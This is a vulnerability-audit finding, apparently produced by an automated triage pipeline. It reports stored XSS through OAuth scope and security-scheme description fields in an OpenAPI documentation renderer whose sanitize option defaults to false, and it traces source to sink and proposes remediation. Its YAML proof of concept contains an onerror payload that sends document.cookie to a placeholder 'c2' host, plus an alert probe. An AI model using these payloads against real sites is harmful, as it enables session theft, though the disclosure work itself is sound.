---
ID: H-00-D
Verdict: VALID
FP-Verdict: TRUE-POSITIVE
FP-Confidence: HIGH
FP-Evidence: OAuthFlow.tsx:56-60 `<Markdown ... source={flow!.scopes[scope] || ''}/>` and SecurityRequirement.tsx:63 `<Markdown source={scheme.description || ''} />` both route through Markdown.tsx:28 → SanitizedMdBlock.tsx:16 where `sanitize(false, html)` returns raw HTML when options.sanitize=false (default).
FP-Reasoning: Verified — both sinks confirmed; no per-call sanitize override is threaded (Markdown.tsx:25 destructuring drops the sanitize prop — see also p10-006). With the documented default of options.sanitize=false, attacker-controlled scope/description fields render through `dangerouslySetInnerHTML` without DOMPurify. The sub-finding is taxonomically distinct from H-00-A and stands on the same verified root cause.
Severity-Original: MEDIUM
Class: XSS
Origin-Finding: H-00-D
Origin-Pattern: sanitize-false-default-dangerouslysetinnerhtml
File: [REDACTED].tsx:59
Source: spec.components.securitySchemes.*.flows.*.scopes.<name> (scope description string) | spec.components.securitySchemes.*.description
Sink: [REDACTED].tsx:31 (dangerouslySetInnerHTML) reached via OAuthFlow.tsx:59 (<Markdown inline={true} source={flow.scopes[scope]}/>) and SecurityRequirement.tsx:63 (<Markdown source={scheme.description}/>)
Chamber: chamber-01
Triage-Priority: skip
Triage-Exploitability: moderate
Triage-Impact: medium
Triage-Reasoning: Sub-finding of H-00-A sharing same root cause/sink; scope-description XSS limited to spec-render context; remediation covered by parent finding
Intent-Verdict: intentional-design
Intent-Source: docs/config.md:77-80
Intent-Quote: "sanitize — If set to true, the API definition is considered untrusted and all HTML/Markdown is sanitized to prevent XSS."
Intent-Confidence: strong
Context-Reviewer-Reasoning: context-reviewer: shares root cause with p5-003/p6-002 — sanitize is the documented opt-in operator gate (docs/config.md:77-80, 212-214; CHANGELOG.md:1965). (prior Triage-Priority: P2)
Triage-Model: claude-sonnet-4-6
Triaged-At: 2026-05-19T00:00:00Z
Pre-FP-Flag: SUB-FINDING of H-00-A — same root cause (sanitize=false default) and same sink. Filed separately for taxonomic visibility because spec authors / linters treat OAuth scope strings as short label text and routinely omit them from XSS review. Severity downgraded HIGH → MEDIUM on Advocate review (Pattern 8 double-counting: incremental disclosure value vs. H-00-A, which already enumerates the affected-fields list). May be merged into H-00-A during downstream dedup.
Debate: archon/chamber-workspace/chamber-01/debate.md
---

# OAuth Scope and Security-Scheme Description XSS via Default sanitize=false

## Source → Sink Path

1. `src/services/AcmeNormalizedOptions.ts:317` — `this.sanitize = argValueToBoolean(raw.sanitize || raw.untrustedSpec)` → defaults to `false` (per H-00-A root cause).
2. `[REDACTED].tsx:59` — `<Markdown inline={true} source={flow.scopes[scope]}/>` — OAuth flow scope description string from `spec.components.securitySchemes.*.flows.*.scopes`.
3. `[REDACTED].tsx:63` — `<Markdown source={scheme.description}/>` — security scheme description.
4. Both reach `[REDACTED].tsx:16` → `sanitize(false, html)` returns raw HTML → `:31` `dangerouslySetInnerHTML`.

## Attack Mechanic

0-click XSS via `<img src=x onerror=...>` in any OAuth scope description value or in a security scheme description. Fires on initial render when the Security section is in the rendered tree (default).

```yaml
components:
  securitySchemes:
    oauth2:
      type: oauth2
      description: "<img src=x onerror=fetch('https://c2/?c='+document.cookie)>"
      flows:
        implicit:
          authorizationUrl: https://example.com/auth
          scopes:
            read: "<img src=x onerror=alert(document.domain)>"
```

## Why Filed Separately From H-00-A

Spec authors and OpenAPI linters routinely treat scope-name → scope-description maps as plain-text annotations (think "human readable scope label"), not as HTML. Reviewers who grep `info.description` for `<` may never look at `flows.*.scopes.*`. The taxonomic value is "these are unexpected XSS sinks downstream of the same root cause."

## Why Protection Does Not Apply

- `options.sanitize` defaults to `false` — DOMPurify is bypassed regardless of which Markdown-bearing field is rendered.
- Per Tracer evidence: confirmed by probes PH-16 and PH-17 in `archon/probe-workspace/url-security-search/probe-summary.md`.

## Preconditions

- Default Acme configuration.
- Spec contains a `securitySchemes` block with attacker-controlled `description` or scope-name → description map.

## Remediation

Adopt the H-00-A remediation (change `sanitize` default to `true`, or warn loudly when default is active with a fetched-spec URL). No additional per-site fix is required if H-00-A is remediated.
